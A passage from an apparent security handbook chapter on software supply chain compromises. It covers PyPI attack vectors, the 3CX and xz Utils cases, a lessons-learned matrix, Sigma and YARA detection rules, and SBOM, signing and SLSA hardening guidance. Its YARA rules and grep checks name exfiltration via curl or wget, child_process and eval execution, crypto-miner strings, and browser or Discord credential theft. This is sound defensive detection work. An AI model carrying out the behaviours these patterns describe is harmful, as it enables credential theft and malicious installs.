| VMConnect | 2023-08 | ~24 packages mimicking VMware tools | Typosquatting | Reverse shell, keylogger |
| BlazeStealer | 2023-11 | ~12 packages | Dependency confusion + typosquatting | Webcam capture, Discord token theft, ransomware |
| Ultralytics (legitimate) | 2023-12 | 1 package (compromised build) | GitHub Actions cache poisoning | Cryptocurrency miner |
| Revival Hijack | 2024-04 | ~22,000 package names claimed | Name reuse of deleted packages | Varied (mostly PoC) |

**PyPI-specific attack vectors:**

1. **setup.py execution at install time.** `pip install` executes `setup.py` — any arbitrary code in `setup.py`, `setup.cfg` via custom commands, or `__init__.py` runs with the installing user's privileges. PEP 517/518 (`pyproject.toml` + build backends) reduces but does not eliminate install-time code execution.

2. **StarJacking.** PyPI does not verify the GitHub repository URL in package metadata. Attackers set their malicious package's `project_urls` to point to the legitimate project's GitHub repository, inheriting its star count and apparent legitimacy in search results.

3. **Name reuse after deletion.** When a legitimate maintainer deletes (yanks) a package, the name becomes available for re-registration. The Revival Hijack technique monitors PyPI for deleted popular package names and immediately claims them.

**Detection — PyPI-specific behavioral analysis:**

```bash
# Inspect a PyPI package before installing
pip download --no-deps --no-binary :all: suspect-package==1.0.0 -d /tmp/inspect/
cd /tmp/inspect/ && tar xzf *.tar.gz

# Check setup.py for suspicious patterns
grep -rn "subprocess\|os\.system\|exec(\|eval(\|__import__\|socket\|requests\.get\|urllib" setup.py

# Check for obfuscated code
grep -rn "\\\\x[0-9a-f]\{2\}\|base64\|codecs\.decode\|marshal\.loads\|compile(" setup.py *.py

# Use pip-audit for known vulnerabilities
pip-audit -r requirements.txt --format=json

# Use Packj for behavioral analysis
packj audit pypi suspect-package
```

### 6.5 3CX — cascading supply chain attack

The 3CX compromise (March 2023, CVE-2023-29059) demonstrated a previously theoretical attack: one supply chain compromise enabling a second. Lazarus Group (DPRK) first trojanized Trading Technologies' X_TRADER desktop application. When a 3CX employee installed the compromised X_TRADER on a personal machine, the VEILEDSIGNAL malware stole credentials that gave the attackers access to 3CX's corporate network and build infrastructure. From there, they injected malicious code into the 3CX Desktop App, which reached ~600,000 organizations.

**Detection timeline.** The X_TRADER compromise occurred in early 2022. The 3CX compromise was detected in March 2023 by CrowdStrike and SentinelOne when endpoint detection agents flagged anomalous behavior from `3CXDesktopApp.exe` — specifically, the spawning of `cmd.exe` to fetch icon files from GitHub and the injection of shellcode from `d3dcompiler_47.dll`. The cascading nature (X_TRADER → employee machine → corporate network → build infrastructure → 3CX Desktop App → customers) was not fully mapped until Mandiant's analysis in April 2023.

**Structural lesson.** Traditional supply chain security focuses on direct dependencies. The 3CX case proves that third-party software installed on employee personal devices — outside any corporate SBOM or dependency tracking — can serve as the initial access vector to compromise corporate build infrastructure. The attack surface extends beyond `package.json` and `requirements.txt` to every application on every machine with access to the build environment.

### 6.6 XZ Utils — social engineering of maintainer trust

The xz utils backdoor (CVE-2024-3094, CVSS 10.0) represents the most patient and sophisticated social engineering attack against open-source infrastructure ever documented. Full technical analysis appears in Chapter 19B §1. The forensic lesson is the exploitation of human dynamics: open-source maintainer burnout, the absence of formal identity verification for commit access, and the weaponization of community pressure via sockpuppet accounts.

**Detection factors.** Andres Freund noticed ~500ms SSH latency regression on Debian Sid. The latency resulted from the IFUNC resolver performing GOT scanning and cryptographic key derivation at library load time. Had the attacker optimized the resolver to defer expensive operations, the performance anomaly would have been smaller and likely unnoticed. The backdoor was weeks away from reaching Debian Stable, Ubuntu 24.04 LTS, and Fedora 40 — distributions serving millions of servers.

**Counterfactual.** Without Freund's detection, the backdoor would have provided a nation-state actor with unauthenticated root-level remote command execution on a significant fraction of the world's Linux servers. No reproducible-build verification, SBOM correlation, or binary signing system in common use at the time would have detected it — the malicious payload was only present in the release tarball, not in the git source, and the tarball was signed by the compromised co-maintainer's legitimate GPG key.

### 6.7 Lessons learned matrix

| Dimension | SolarWinds (2020) | Codecov (2021) | ua-parser-js (2021) | colors/faker (2022) | 3CX (2023) | xz Utils (2024) |
|-----------|-------------------|----------------|----------------------|---------------------|------------|-----------------|
| **Attack vector** | Build server injection | Remote script modification | Account compromise | Maintainer sabotage | Cascading supply chain | Social engineering + build injection |
| **Initial access** | Unknown (likely creds) | Docker image credential leak | Credential reuse, no 2FA | Legitimate maintainer | Trojanized third-party app | 2-year trust building |
| **Time to detection** | ~14 months | ~60 days | ~4 hours | ~hours (broke builds) | ~1 year (X_TRADER → 3CX) | ~4 weeks (release → disclosure) |
| **Detection method** | Attacker pivot into FireEye | Customer network monitoring | Community reports | Build failures | EDR behavioral detection | Performance profiling (luck) |
| **Blast radius** | ~18,000 orgs, ~100 targeted | Unknown (thousands of CI envs) | ~8M weekly downloads affected | Thousands of packages | ~600,000 orgs | Caught before stable distros |
| **Code signing** | Attacker used legitimate cert | N/A (bash script, no signing) | npm publish (no provenance) | Legitimate maintainer | Attacker used legitimate cert | Legitimate co-maintainer GPG |
| **Would SLSA L3 prevent?** | YES (isolated, ephemeral build) | PARTIALLY (script not a build artifact) | NO (legitimate publish) | NO (legitimate maintainer) | YES (build provenance chain) | PARTIALLY (tarball-vs-git diff) |
| **Would SBOM detect?** | NO (backdoor in first-party code) | NO (modified external tool) | YES (unexpected version change) | YES (version anomaly) | PARTIALLY (DLL injection detectable) | NO (embedded in build system) |
| **Key countermeasure** | Reproducible builds + provenance | Integrity-verified install scripts | Registry-enforced 2FA + provenance | Lockfile pinning + `npm ci` | Zero-trust build env access | Tarball-vs-source diffing, multi-maintainer review |
| **Regulatory impact** | EO 14028, SBOM mandates | — | npm mandatory 2FA (2022) | — | — | OpenSSF funding increase |

### 6.8 Cross-cutting patterns

Three structural patterns recur across all cases:

1. **Signing is necessary but insufficient.** In four of six cases (SolarWinds, 3CX, xz, colors/faker), the malicious artifact carried a valid cryptographic signature because the attacker either controlled the signing key or was the legitimate maintainer. Signature verification proves provenance, not intent. Additional controls (reproducible builds, multi-party review, behavioral analysis) are required.

2. **Detection is accidental.** In five of six cases, detection resulted from a side effect (performance regression, broken builds, unrelated investigation) rather than a purpose-built supply chain monitoring system. Purpose-built detection requires both artifact-level integrity verification (hash comparison, provenance attestation) and behavioral analysis (runtime monitoring of package install behavior, CI/CD network traffic).

3. **Human trust is the weakest link.** Credential reuse (ua-parser-js), maintainer burnout (xz), and employee BYOD (3CX) are human-layer vulnerabilities that no purely technical control addresses. Mandatory 2FA, identity verification for commit access, and zero-trust network segmentation of build infrastructure reduce but do not eliminate these risks.

---

## 7. Supply chain detection engineering

This section provides detection rules targeting specific supply chain threat indicators not covered in Chapter 19B §9. Where 19B focuses on build-time anomalies, hermetic build violations, and eBPF-based build monitoring, this section addresses package ecosystem, artifact registry, and SBOM-level detection.

### 7.1 Dependency confusion indicators

Detects when a private/internal package name resolves from a public registry — the core dependency confusion attack pattern.

```yaml
title: Private Package Name Resolved from Public Registry
id: 1a2b3c4d-5e6f-7a8b-9c0d-1e2f3a4b5c6d
status: experimental
description: >
  Detects when a package name matching the internal naming convention resolves
  from a public registry instead of the configured private registry. Indicates
  potential dependency confusion attack.
author: Supply chain defense team
date: 2024-09-01
tags:
  - attack.initial_access
  - attack.t1195.002
logsource:
  category: application
  product: package_manager
detection:
  selection_internal_name:
    PackageName|startswith:
      - 'company-'
      - 'internal-'
      - 'corp-'
    # Adapt prefixes to your organization's naming convention
  selection_public_source:
    RegistrySource|contains:
      - 'registry.npmjs.org'
      - 'pypi.org'
      - 'nuget.org'
      - 'crates.io'
      - 'rubygems.org'
  condition: selection_internal_name and selection_public_source
falsepositives:
  - Internal packages that are intentionally published to public registries
level: critical
```

**Operational detection script — npm dependency confusion check:**

```bash
#!/usr/bin/env bash
# Detect dependency confusion: internal package names that exist on public npm
# Run in CI or as a scheduled audit

set -euo pipefail

PRIVATE_REGISTRY="https://npm.internal.company.com"
LOCKFILE="${1:-package-lock.json}"

jq -r '.packages | to_entries[] | select(.value.resolved != null) | .key' "$LOCKFILE" \
  | sed 's|^node_modules/||' \
  | while read -r pkg; do
      # Check if package is from private registry
      resolved=$(jq -r ".packages[\"node_modules/$pkg\"].resolved // empty" "$LOCKFILE")
      if echo "$resolved" | grep -q "$PRIVATE_REGISTRY"; then
        # Package is from private registry — check if name exists on public
        status=$(curl -s -o /dev/null -w "%{http_code}" "https://registry.npmjs.org/$pkg")
        if [ "$status" = "200" ]; then
          echo "ALERT: Private package '$pkg' also exists on public npm — confusion risk"
        fi
      fi
    done
```

### 7.2 CI/CD pipeline modification outside approval process

Detects unauthorized modifications to pipeline definition files outside the normal merge-request workflow.

```yaml
title: CI/CD Pipeline Definition Modified Outside Merge Request
id: 2b3c4d5e-6f7a-8b9c-0d1e-2f3a4b5c6d7e
status: experimental
description: >
  Detects direct pushes to pipeline definition files (Jenkinsfile, .github/workflows/,
  .gitlab-ci.yml, azure-pipelines.yml) that bypass the merge request review process.
  Pipeline definitions are high-value targets for supply chain attacks.
author: Supply chain defense team
date: 2024-09-01
tags:
  - attack.defense_evasion
  - attack.t1195.002
logsource:
  category: vcs
  product: git_platform
detection:
  selection_files:
    FilePath|contains:
      - '.github/workflows/'
      - '.gitlab-ci.yml'
      - 'Jenkinsfile'
      - 'azure-pipelines.yml'
      - '.circleci/config.yml'
      - 'Taskfile.yml'
      - 'Makefile'
      - 'build.gradle'
      - 'pom.xml'
  selection_direct_push:
    EventType: 'push'
    MergeRequestId: null
  filter_protected_branch:
    BranchProtection: 'enabled'
  condition: selection_files and selection_direct_push and not filter_protected_branch
falsepositives:
  - Emergency hotfixes with post-hoc review
  - Initial repository setup
level: high
```

### 7.3 Unusual package publication patterns

Detects anomalous publishing behavior in package registries that correlates with compromise or typosquatting campaigns.

```yaml
title: Anomalous Package Registry Publication Pattern
id: 3c4d5e6f-7a8b-9c0d-1e2f-3a4b5c6d7e8f
status: experimental
description: >
  Detects unusual publication patterns: rapid succession of new package versions,
  publication from a new IP/location, or version number jumps (e.g., 1.0.0 to 99.0.0)
  that indicate dependency confusion or account compromise.
author: Supply chain defense team
date: 2024-09-01
tags:
  - attack.initial_access
  - attack.t1195.002
logsource:
  category: application
  product: package_registry
detection:
  selection_version_jump:
    VersionDelta|gt: 10
    # Major version jump > 10 from previous publication
  selection_rapid_publish:
    PublicationCount|gt: 5
    TimeWindow: '1h'
  selection_new_publisher:
    PublisherAccountAge|lt: '7d'
    PackageDownloads|gt: 1000
    # New account publishing to a popular package
  condition: selection_version_jump or selection_rapid_publish or selection_new_publisher
falsepositives:
  - Legitimate major version bumps
  - Package ownership transfers
level: high
```

### 7.4 Compromised signing key indicators

```yaml
title: Build Artifact Signed with Revoked or Expired Key
id: 4d5e6f7a-8b9c-0d1e-2f3a-4b5c6d7e8f9a
status: experimental
description: >
  Detects build artifacts or packages signed with keys that have been revoked,
  expired, or that do not match the expected key for the artifact's publisher.
  Indicates potential signing infrastructure compromise.
author: Supply chain defense team
date: 2024-09-01
tags:
  - attack.defense_evasion
  - attack.t1195.002
logsource:
  category: application
  product: artifact_registry
detection:
  selection_revoked:
    SignatureStatus: 'revoked_key'
  selection_expired:
    SignatureStatus: 'expired_key'
    ArtifactAge|lt: '24h'
    # Freshly published artifact with expired key = suspicious
  selection_key_mismatch:
    SigningKeyFingerprint|ne: ExpectedKeyFingerprint
    PackageName|exists: true
  condition: selection_revoked or (selection_expired) or selection_key_mismatch
falsepositives:
  - Key rotation during transition period
level: critical
```

### 7.5 Build environment integrity violations

```yaml
title: Build Environment Integrity Violation
id: 5e6f7a8b-9c0d-1e2f-3a4b-5c6d7e8f9a0b
status: experimental
description: >
  Detects modifications to the build environment during build execution:
  unexpected file writes to build tool directories, modified compiler binaries,
  or altered build configuration files. Targets SUNSPOT-style build injection.
author: Supply chain defense team
date: 2024-09-01
tags:
  - attack.execution
  - attack.t1195.002
logsource:
  category: file_event
  product: linux
detection:
  selection_compiler_modification:
    TargetFilename|endswith:
      - '/gcc'
      - '/g++'
      - '/cc1'
      - '/rustc'
      - '/javac'
      - '/go'
    EventType: 'modification'
  selection_build_config_change:
    TargetFilename|endswith:
      - '/Makefile'
      - '/CMakeLists.txt'
      - '/build.gradle'
      - '/pom.xml'
      - '/Cargo.toml'
    EventType: 'modification'
    ProcessName|ne: 'git'
    # Config files should only change via VCS checkout, not during build
  selection_source_modification_during_build:
    TargetFilename|endswith:
      - '.c'
      - '.cpp'
      - '.cs'
      - '.java'
      - '.rs'
      - '.go'
      - '.py'
    EventType: 'modification'
    ParentProcessName|contains:
      - 'make'
      - 'msbuild'
      - 'gradle'
      - 'cargo'
      - 'bazel'
  condition: selection_compiler_modification or selection_build_config_change or selection_source_modification_during_build
falsepositives:
  - Code generators that produce source files during build
  - Build systems that modify configuration files as part of version stamping
level: critical
```

### 7.6 YARA rules for malicious npm and PyPI packages

```yara
rule Malicious_NPM_Preinstall_Script
{
    meta:
        description = "Detects npm packages with suspicious preinstall/postinstall hooks"
        author = "Supply chain defense team"
        date = "2024-09-01"
        reference = "ua-parser-js, coa, rc npm compromises"
        severity = "HIGH"

    strings:
        $preinstall = "\"preinstall\"" ascii
        $postinstall = "\"postinstall\"" ascii
        $install_hook = "\"install\"" ascii

        // Exfiltration patterns
        $curl_exfil = /curl\s+(-[sS]+\s+)*https?:\/\/\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/ ascii
        $wget_exfil = /wget\s+(-q\s+)?https?:\/\/\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/ ascii
        $node_exfil = "child_process" ascii
        $exec_cmd = /exec\s*\(\s*['"`]/ ascii

        // Obfuscation patterns
        $hex_encoded = /\\x[0-9a-f]{2}\\x[0-9a-f]{2}\\x[0-9a-f]{2}/ ascii
        $base64_decode = "Buffer.from(" ascii
        $atob = "atob(" ascii
        $eval_call = /eval\s*\(/ ascii

        // Crypto miner indicators
        $stratum = "stratum+tcp://" ascii
        $xmrig = "xmrig" ascii nocase
        $monero = "monero" ascii nocase

    condition:
        ($preinstall or $postinstall or $install_hook)
        and (
            ($curl_exfil or $wget_exfil)
            or ($node_exfil and $exec_cmd)
            or ($hex_encoded and $eval_call)
            or ($base64_decode and $eval_call)
            or $stratum or $xmrig or $monero
        )
}

rule Malicious_PyPI_Setup_Script
{
    meta:
        description = "Detects PyPI packages with suspicious setup.py execution patterns"
        author = "Supply chain defense team"
        date = "2024-09-01"
        reference = "W4SP Stealer, BlazeStealer PyPI campaigns"
        severity = "HIGH"

    strings:
        $setup_call = "setup(" ascii
        $cmdclass = "cmdclass" ascii

        // Code execution in setup.py
        $os_system = "os.system(" ascii
        $subprocess = "subprocess" ascii
        $popen = "Popen(" ascii
        $exec_py = /exec\s*\(/ ascii
        $eval_py = /eval\s*\(/ ascii
        $compile = "compile(" ascii
        $marshal = "marshal.loads" ascii

        // Network exfiltration in setup.py
        $requests = "requests.post(" ascii
        $urllib = "urllib.request" ascii
        $socket = "socket.socket(" ascii
        $httplib = "http.client" ascii

        // Obfuscation
        $b64 = "base64.b64decode" ascii
        $codecs = "codecs.decode" ascii
        $fernet = "Fernet(" ascii
        $zlib = "zlib.decompress" ascii

        // Discord/browser credential theft (common in PyPI malware)
        $discord_token = "discord" ascii nocase
        $chrome_db = "Login Data" ascii
        $firefox_db = "logins.json" ascii
        $keyring = "keyring" ascii

    condition:
        ($setup_call or $cmdclass)
        and (
            (($os_system or $subprocess or $popen) and ($requests or $urllib or $socket))
            or ($exec_py and ($b64 or $codecs or $marshal))
            or ($eval_py and ($b64 or $codecs or $zlib))
            or ($discord_token and ($chrome_db or $firefox_db))
        )
}

rule Trojanized_Build_Tool_Artifact
{
    meta:
        description = "Detects build artifacts that contain embedded payloads inconsistent with expected tool output"
        author = "Supply chain defense team"
        date = "2024-09-01"
        reference = "SolarWinds SUNSPOT, xz utils CVE-2024-3094"
        severity = "CRITICAL"

    strings:
        // Shell commands embedded in build scripts that perform multi-stage decoding
        $staged_decode = /head\s+-c\s+\d+\s*\|\s*tail\s+-c\s+\d+/ ascii
        $tr_deobfuscate = /tr\s+"[^"]+"\s+"[^"]+"/ ascii
        $eval_pipeline = /\|\s*eval/ ascii
        $xz_extract = /xz\s+-d\s+--single-stream/ ascii

        // Indicators of payload injection into legitimate build outputs
        $ifunc_resolver = "__attribute__((ifunc" ascii
        $got_overwrite = "dlsym(RTLD_NEXT" ascii
        $proc_self_maps = "/proc/self/maps" ascii
        $proc_self_exe = "/proc/self/exe" ascii

        // Anti-analysis checks in build scripts
        $valgrind_check = "RUNNING_ON_VALGRIND" ascii
        $landlock_check = "landlock_restrict_self" ascii
        $ld_debug = "LD_DEBUG" ascii
        $sanitizer = "-fsanitize" ascii

    condition:
        (($staged_decode and $tr_deobfuscate) or ($eval_pipeline and $xz_extract))
        or (($ifunc_resolver or $got_overwrite) and ($proc_self_maps or $proc_self_exe))
        or (3 of ($valgrind_check, $landlock_check, $ld_debug, $sanitizer) and ($ifunc_resolver or $got_overwrite))
}
```

### 7.7 SBOM-based vulnerability correlation pipeline

SBOM-driven detection integrates CycloneDX or SPDX documents with vulnerability databases to identify compromised or vulnerable components in deployed artifacts.

```bash
#!/usr/bin/env bash
# SBOM-to-vulnerability correlation pipeline
# Input: CycloneDX SBOM (JSON), Output: vulnerability report

set -euo pipefail

SBOM_FILE="${1:?Usage: $0 <sbom.json>}"
OSV_API="https://api.osv.dev/v1/query"
REPORT_FILE="vuln-report-$(date -u +%Y%m%dT%H%M%SZ).json"

# Extract package-version pairs from CycloneDX SBOM
jq -r '.components[] | "\(.purl // "")\t\(.name)\t\(.version)"' "$SBOM_FILE" \
  | while IFS=$'\t' read -r purl name version; do
      if [ -n "$purl" ]; then
        # Query OSV by PURL (most precise)
        result=$(curl -s -X POST "$OSV_API" \
          -H "Content-Type: application/json" \
          -d "{\"package\":{\"purl\":\"$purl\"}}")
      else
        # Fallback: query by name+version with ecosystem guess
        ecosystem="npm"  # Default; production code should infer from SBOM metadata
        result=$(curl -s -X POST "$OSV_API" \
          -H "Content-Type: application/json" \
          -d "{\"package\":{\"name\":\"$name\",\"ecosystem\":\"$ecosystem\"},\"version\":\"$version\"}")
      fi

      vuln_count=$(echo "$result" | jq '.vulns | length // 0')
      if [ "$vuln_count" -gt 0 ]; then
        echo "$result" | jq --arg pkg "$name" --arg ver "$version" \
          '{package: $pkg, version: $ver, vulnerabilities: [.vulns[] | {id: .id, summary: .summary, severity: .database_specific.severity}]}'
      fi
    done | jq -s '.' > "$REPORT_FILE"

echo "Vulnerability report: $REPORT_FILE ($(jq length "$REPORT_FILE") packages with findings)"
```

**Container image SBOM generation and verification:**

```bash
# Generate SBOM for a container image using Syft
syft packages registry.example.com/app:v1.2.3 -o cyclonedx-json > app-sbom.json

# Verify container image signature before SBOM analysis
cosign verify --key cosign.pub registry.example.com/app:v1.2.3

# Attach SBOM as an OCI artifact alongside the image
cosign attach sbom --sbom app-sbom.json registry.example.com/app:v1.2.3

# Verify SBOM attestation
cosign verify-attestation --type cyclonedx \
  --key cosign.pub registry.example.com/app:v1.2.3
```

### 7.8 Artifact registry monitoring

**Binary signature verification for container images:**

```bash
# Verify all images in a Kubernetes namespace have valid signatures
kubectl get pods -n production -o jsonpath='{range .items[*]}{range .spec.containers[*]}{.image}{"\n"}{end}{end}' \
  | sort -u \
  | while read -r image; do
      if ! cosign verify --key cosign.pub "$image" 2>/dev/null; then
        echo "UNSIGNED/INVALID: $image"
      fi
    done
```

**OPA/Gatekeeper policy — reject unsigned images:**

```yaml
apiVersion: templates.gatekeeper.sh/v1
kind: ConstraintTemplate
metadata:
  name: k8srequireimagesigantures
spec:
  crd:
    spec:
      names:
        kind: K8sRequireImageSignatures
  targets:
    - target: admission.k8s.gatekeeper.sh
      rego: |
        package k8srequireimagesignatures

        violation[{"msg": msg}] {
          container := input.review.object.spec.containers[_]
          image := container.image
          not has_valid_signature(image)
          msg := sprintf("Container image '%v' does not have a valid cosign signature", [image])
        }

        has_valid_signature(image) {
          # In production, call cosign verify via external data or
          # use Kyverno/Sigstore policy-controller for native verification
          input.review.object.metadata.annotations["cosign.sigstore.dev/signature"] != ""
        }
```

---

## 8. Supply chain security architecture

This section describes the reference architecture for a secure software supply chain. Implementation details for individual components appear in Chapter 19B (§3 CI/CD pipeline security, §5 Sigstore, §6 SBOM, §8 build hardening). This section shows how the components compose into an end-to-end system.

### 8.1 Secure build pipeline — hermetic and reproducible builds

A hermetic build is one where all inputs are explicitly declared and the build has no network access during compilation. Reproducibility means that given the same inputs, the build produces bit-for-bit identical output.

**Architecture layers:**

```
┌─────────────────────────────────────────────────────────────┐
│                    Source Code (VCS)                         │
│  Branch protection · Signed commits · MR-only changes       │
├─────────────────────────────────────────────────────────────┤
│                 Dependency Resolution                        │
│  Private registry mirror · Lockfile hash verification       │
│  Package Source Mapping · Allowlisted sources only           │
├─────────────────────────────────────────────────────────────┤
│                   Build Environment                          │
│  Ephemeral runners · No network · Read-only source mount    │
│  Immutable base images · Build logs tamper-evident           │
├─────────────────────────────────────────────────────────────┤
│                   Build Provenance                           │
│  SLSA provenance attestation · Builder identity · Inputs    │
│  Non-forgeable (signed by build platform, not developer)    │
├─────────────────────────────────────────────────────────────┤
│                   Artifact Signing                           │
│  Sigstore cosign · Rekor transparency log · SBOM attachment │
├─────────────────────────────────────────────────────────────┤
│                 Artifact Registry                            │
│  Admission policy: signature + provenance required          │
│  Vulnerability scanning · SBOM indexing                      │
├─────────────────────────────────────────────────────────────┤
│                     Deployment                               │
│  Kubernetes admission: image signature verification          │
│  Runtime SBOM correlation · Continuous monitoring            │
└─────────────────────────────────────────────────────────────┘
```

**Build provenance with SLSA (GitHub Actions example):**

```yaml
# .github/workflows/release.yml — SLSA L3 provenance generation
name: Release with SLSA Provenance
on:
  push:
    tags: ['v*']

permissions:
  contents: write
  id-token: write  # Required for Sigstore OIDC

jobs:
  build:
    runs-on: ubuntu-latest
    outputs:
      digest: ${{ steps.hash.outputs.digest }}
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2
      - name: Build
        run: |
          # Hermetic build — no network after dependency fetch
          npm ci --ignore-scripts
          npm run build
      - name: Generate digest
        id: hash
        run: |
          sha256sum dist/* | base64 -w0 > digest.txt
          echo "digest=$(cat digest.txt)" >> "$GITHUB_OUTPUT"

  provenance:
    needs: build
    permissions:
      actions: read
      id-token: write
      contents: write
    uses: slsa-framework/slsa-github-generator/.github/workflows/generator_generic_slsa3.yml@v2.1.0
    with:
      base64-subjects: "${{ needs.build.outputs.digest }}"
      upload-assets: true
```

### 8.2 Artifact signing infrastructure

**Sigstore deployment model (keyless signing with transparency):**

1. **Developer/CI** authenticates via OIDC (GitHub Actions, GitLab CI, Google Workspace).
2. **Fulcio CA** issues a short-lived certificate (10 min) binding the OIDC identity to a signing key.
3. **cosign** signs the artifact with the ephemeral key.
4. **Rekor** records the signing event in an append-only transparency log — providing public, tamper-evident proof that the artifact was signed by the claimed identity at a specific time.
5. **Verifier** checks the Rekor log entry + Fulcio certificate chain. No long-lived keys to manage or rotate.

```bash
# Sign a container image (keyless, uses OIDC identity from CI)
cosign sign --yes registry.example.com/app:v1.2.3

# Verify with expected OIDC issuer and identity constraints
cosign verify \
  --certificate-oidc-issuer="https://token.actions.githubusercontent.com" \
  --certificate-identity-regexp="^https://github.com/myorg/myrepo/" \
  registry.example.com/app:v1.2.3

# Sign a binary blob (non-container artifact)
cosign sign-blob --yes --bundle artifact.sig.bundle ./my-binary

# Verify blob signature
cosign verify-blob --bundle artifact.sig.bundle \
  --certificate-oidc-issuer="https://token.actions.githubusercontent.com" \
  --certificate-identity-regexp="^https://github.com/myorg/" \
  ./my-binary
```

### 8.3 Dependency management architecture

**Lockfile enforcement and version pinning strategy:**

| Strategy | Mechanism | Risk Mitigated | Limitation |
|----------|-----------|----------------|------------|
| Lockfile-only installs | `npm ci`, `pip install --require-hashes` | Version drift, dependency confusion | Does not prevent compromised pinned version |
| Hash verification | SHA-256 of each dependency in lockfile | Tampering between registry and consumer | Registry compromise before hash capture |
| Private registry mirroring | Artifactory/Nexus as exclusive upstream | Public registry compromise | Mirror must be kept current; stale mirrors miss patches |
| Package Source Mapping | NuGet 6.0+ `packageSourceMapping` | Namespace confusion (private vs public) | NuGet-specific; other ecosystems lack equivalent |
| Scoped registries | npm `@org/` scope → private registry | Unscoped name confusion | Requires consistent scope usage |

**npm dependency lockdown configuration:**

```ini
# .npmrc — enforce private registry and lockfile integrity
registry=https://npm.internal.company.com
@company:registry=https://npm.internal.company.com
package-lock=true
save-exact=true
audit=true
fund=false
engine-strict=true
```

```bash
# CI pipeline — lockfile-only install with integrity check
npm ci --ignore-scripts          # Install from lockfile, skip lifecycle scripts
npm audit --audit-level=high     # Fail on high/critical vulnerabilities
npm exec -- lockfile-lint \
  --path package-lock.json \
  --type npm \
  --allowed-hosts npm \
  --validate-https              # Ensure all resolved URLs are HTTPS
```

**pip dependency lockdown:**

```bash
# Generate locked requirements with hashes
pip-compile --generate-hashes --output-file=requirements.lock requirements.in

# Install with hash verification — rejects any package that doesn't match
pip install --require-hashes --no-deps -r requirements.lock

# Configure private index only (no public fallback)
# pip.conf
[global]
index-url = https://pypi.internal.company.com/simple/
extra-index-url =
# Explicitly empty extra-index-url prevents PyPI fallback
```

### 8.4 CI/CD hardening checklist

| Control | Implementation | SLSA Level |
|---------|---------------|------------|
| Pinned actions/dependencies | SHA-pinned `uses:` in workflows, lockfile hashes | L1 |
| Least-privilege tokens | `permissions:` scoped per job, OIDC for cloud access | L1 |
| Ephemeral runners | Self-hosted runners destroy after each job | L2 |
| Isolated build service | Build runs on dedicated infrastructure, not developer CI | L3 |
| Non-forgeable provenance | Generated by the build platform, not the build script | L3 |
| Hermetic build | No network during compilation phase | L4 |
| Reproducible build | Bit-for-bit reproducibility verified by independent rebuilders | L4 |
| Two-person review | All pipeline changes require 2+ approvals | L3+ |
| Secret management | No secrets in env vars; use OIDC, vault, or sealed secrets | L2+ |
| Audit logging | Immutable logs of all pipeline runs, config changes, secret access | L2+ |

---

## 9. Supply chain maturity assessment

### 9.1 SLSA framework — level requirements and implementation roadmap

SLSA (Supply-chain Levels for Software Artifacts) defines four levels of increasing assurance. Each level builds on the previous.

| Requirement | L1 | L2 | L3 | L4 |
|-------------|----|----|----|----|
| Provenance exists | YES | YES | YES | YES |
| Provenance is signed | — | YES | YES | YES |
| Build service (not ad hoc) | — | YES | YES | YES |
| Provenance non-forgeable | — | — | YES | YES |
| Isolated build environment | — | — | YES | YES |
| Ephemeral environment | — | — | YES | YES |
| Hermetic build | — | — | — | YES |
| Reproducible build | — | — | — | YES |
| Two-person source review | — | — | YES | YES |

**Implementation roadmap (phased):**

**Phase 1 (L1, weeks 1-4):** Generate provenance for all build artifacts. Use `slsa-github-generator` or Tekton Chains. Provenance documents the build inputs, builder identity, and build parameters. No isolation requirements at this level — the provenance may be self-attested.

**Phase 2 (L2, weeks 5-12):** Move builds to a hosted build service (GitHub Actions, GitLab CI, Cloud Build). Sign provenance attestations. Implement OIDC-based signing via Sigstore. Artifact consumers can now verify that a known build service produced the artifact.

**Phase 3 (L3, months 3-6):** Isolate the build service so that no single person can influence the build output. Use ephemeral runners that are destroyed after each job. Generate provenance that the build service signs (not the developer) — ensuring provenance is non-forgeable even if a developer's credentials are compromised. Enforce two-person review on all source changes that reach the build.

**Phase 4 (L4, months 6-12+):** Implement hermetic builds (no network during compilation). Achieve reproducible builds (independent rebuilders produce identical output). This is the hardest level — many language ecosystems embed timestamps, randomized symbol ordering, or non-deterministic codegen that must be patched or configured away.

### 9.2 OpenSSF Scorecard — automated supply chain security scoring

OpenSSF Scorecard (https://scorecard.dev) evaluates open-source projects across multiple supply chain security dimensions. Use it to assess both your own projects and your dependencies.

```bash
# Install Scorecard
go install github.com/ossf/scorecard/v5/cmd/scorecard@latest

# Score a repository
scorecard --repo=github.com/org/repo --format=json > scorecard.json

# Key checks and their meaning
# Binary-Artifacts: no checked-in binaries (prevents trojanized test fixtures, cf. xz)
# Branch-Protection: require review, status checks, signed commits
# Code-Review: all changes reviewed before merge
# Dangerous-Workflow: no dangerous patterns in CI (pull_request_target with checkout)
# Dependency-Update-Tool: Dependabot/Renovate configured
# Maintained: recent commits, responsive to issues
# Pinned-Dependencies: SHA-pinned actions and container base images
# SAST: static analysis integrated
# Security-Policy: SECURITY.md present
# Signed-Releases: release artifacts are signed
# Token-Permissions: GitHub Actions use least-privilege permissions
# Vulnerabilities: no known unpatched vulnerabilities (via OSV)
```

**Integrating Scorecard into dependency review:**

```bash
# Score all direct dependencies and flag low-scoring ones
jq -r '.packages | to_entries[] | .value.resolved // empty' package-lock.json \
  | grep -oP 'github\.com/[^/]+/[^/]+' \
  | sort -u \
  | while read -r repo; do
      score=$(scorecard --repo="https://$repo" --format=json 2>/dev/null \
        | jq '.score // 0')
      if [ "$(echo "$score < 5" | bc)" -eq 1 ]; then
        echo "LOW SCORE ($score/10): $repo — manual review required"
      fi
    done
```

### 9.3 Dependency review automation

**Dependabot (GitHub) — configuration:**

```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "weekly"
    open-pull-requests-limit: 10
    reviewers:
      - "security-team"
    labels:
      - "dependencies"
    # Group minor/patch updates to reduce PR noise
    groups:
      production-dependencies:
        patterns:
          - "*"
        update-types:
          - "minor"
          - "patch"
  - package-ecosystem: "github-actions"
    directory: "/"
    schedule:
      interval: "weekly"
    # Pin actions to full SHA, not tags
```

**Renovate — advanced configuration with automerge for low-risk updates:**

```json5
// renovate.json5
{
  "$schema": "https://docs.renovatebot.com/renovate-schema.json",
  "extends": ["config:recommended", "security:openssf-scorecard"],
  "packageRules": [
    {
      "matchUpdateTypes": ["patch"],
      "matchCurrentVersion": "!/^0/",
      "automerge": true,
